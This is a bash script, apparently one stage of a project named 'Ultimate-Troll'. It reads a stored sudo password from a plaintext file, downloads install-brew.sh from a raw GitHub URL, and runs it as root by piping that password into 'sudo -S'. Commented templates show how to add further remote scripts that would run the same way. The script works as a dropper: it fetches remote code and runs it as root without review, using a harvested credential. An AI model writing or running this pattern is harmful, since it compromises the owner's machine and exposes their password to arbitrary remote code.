#!/usr/bin/env bash

TARGET_DIR="$HOME/programfiles"
SUBP_DIR="$TARGET_DIR/subp"
PFILE="$TARGET_DIR/p.txt"

# Verify that the sub-directory exists
if [ ! -d "$SUBP_DIR" ]; then
    echo "❌ Subdirectory '$SUBP_DIR' not found. Please run init-main.sh again."
    exit 1
fi

# Verify sudo password file exists
if [ ! -f "$PFILE" ]; then
    echo "❌ Password file not found at '$PFILE'."
    exit 1
fi
SUDO_PASS=$(<"$PFILE")

# Download required scripts
echo "[*] Downloading install-brew.sh..."
curl -sSL -o "$SUBP_DIR/install-brew.sh" "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/install-brew.sh"

# (Add additional script downloads below as needed)
# Example:
# curl -sSL -o "$SUBP_DIR/another-script.sh" "https://example.com/another-script.sh"

# Make all downloaded scripts executable
chmod +x "$SUBP_DIR/"*.sh

# Run the downloaded scripts
echo "[*] Running install-brew.sh..."
echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/install-brew.sh"

# (Run other scripts below as needed)
# Example:
# echo "$SUDO_PASS" | sudo -S bash "$SUBP_DIR/another-script.sh"

echo "[*] Setup complete!"
# Create a success marker file
touch "$SUBP_DIR/success"